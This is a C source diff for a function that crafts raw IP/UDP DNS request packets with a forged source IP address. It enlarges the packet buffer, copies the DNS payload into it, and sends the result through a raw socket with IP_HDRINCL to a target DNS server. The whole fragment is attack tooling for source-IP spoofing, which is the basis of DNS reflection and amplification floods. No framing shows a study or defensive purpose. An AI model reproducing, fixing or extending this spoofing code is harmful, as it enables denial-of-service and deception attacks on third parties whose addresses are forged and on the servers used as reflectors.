@@ -94,7 +94,7 @@ dns_result dns_req_with_spoofed_ip(DNS_H_UDP *dns, unsigned char *qname, struct 
 {
     int s = -1;
     struct sockaddr_in dest = {0};
-    char datagram[sizeof(struct ip)+sizeof(struct udphdr)+sizeof(struct DNS_UDP_HEADER)] = {0};
+    char datagram[sizeof(struct ip)+sizeof(struct udphdr)+sizeof(struct DNS_UDP_HEADER)+65536] = {0};
 
     feel_dns_header_req(&dns->header);
 
@@ -123,7 +123,6 @@ dns_result dns_req_with_spoofed_ip(DNS_H_UDP *dns, unsigned char *qname, struct 
     struct ip *ip_hdr = (struct ip *) datagram;
     struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
 
-
     ip_hdr->ip_hl = 5; //header length
     ip_hdr->ip_v = 4; //version
     ip_hdr->ip_tos = 0; //tos
@@ -136,19 +135,17 @@ dns_result dns_req_with_spoofed_ip(DNS_H_UDP *dns, unsigned char *qname, struct 
     ip_hdr->ip_src.s_addr = inet_addr (spoofed_ip); //src ip - spoofed
     ip_hdr->ip_dst.s_addr = inet_addr(server); //dst ip
 
-
     srand(time(NULL));   // Initialization, should only be called once.
     int r = rand()%64511;
-    udp_hdr->source = htons(r+1025); //htons(53);
+    udp_hdr->source = htons(r+1025);
     udp_hdr->dest = htons(53); //srand(time(NULL)) % 65536; //dst port
     udp_hdr->len = htons(sizeof(struct udphdr) + len); //length
     udp_hdr->check = 0; //checksum - disabled
 
     ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
-
+    memcpy(datagram+sizeof(struct ip)+sizeof(struct udphdr), buf, len);
     len += sizeof(struct ip);
     len += sizeof(struct udphdr);
-
     int on = 1;
     if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0 ) {
         perror("[-] Error! Cannot set IP_HDRINCL");
